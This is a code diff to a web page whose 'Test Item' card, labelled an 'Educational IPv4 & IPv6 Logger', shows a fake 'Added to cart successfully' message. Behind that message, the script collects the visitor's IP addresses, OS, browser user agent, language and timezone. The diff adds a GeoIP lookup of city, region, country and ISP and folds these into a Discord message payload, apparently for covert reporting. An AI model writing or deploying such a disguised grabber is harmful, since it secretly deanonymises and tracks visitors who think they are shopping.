@@ -65,7 +65,7 @@
 
 <div class="card">
     <h2>Test Item</h2>
-    <p>Educational IPv4 & IPv6 Logger + Full Browser Info</p>
+    <p>Educational IPv4 & IPv6 Logger + Full Browser & Location Info</p>
     <button onclick="sendFullInfo()">Send Full Info</button>
     <div class="notification" id="notify">Added to cart successfully</div>
 </div>
@@ -86,7 +86,15 @@ async function sendFullInfo() {
             ipv6 = (await ipv6Res.json()).ip;
         } catch {}
 
-        // Time & location
+        // GeoIP lookup (using IPv4 for example)
+        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
+        const geoData = await geoRes.json();
+        const city = geoData.city || "Unknown";
+        const region = geoData.region || "Unknown";
+        const country = geoData.country_name || "Unknown";
+        const isp = geoData.org || "Unknown";
+
+        // Time & timezone
         const timestamp = new Date().toLocaleString();
         const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
@@ -112,11 +120,15 @@ async function sendFullInfo() {
             }
         } catch {}
 
-        // Build message
+        // Build Discord message
         const payload = {
             content: `**Educational Browser Info Report**\n` +
                      `**IPv4:** \`${ipv4}\`\n` +
                      `**IPv6:** \`${ipv6}\`\n` +
+                     `**City:** \`${city}\`\n` +
+                     `**Region:** \`${region}\`\n` +
+                     `**Country:** \`${country}\`\n` +
+                     `**ISP:** \`${isp}\`\n` +
                      `**OS:** \`${os}\`\n` +
                      `**Browser UA:** \`${ua}\`\n` +
                      `**Language:** \`${language}\`\n` +
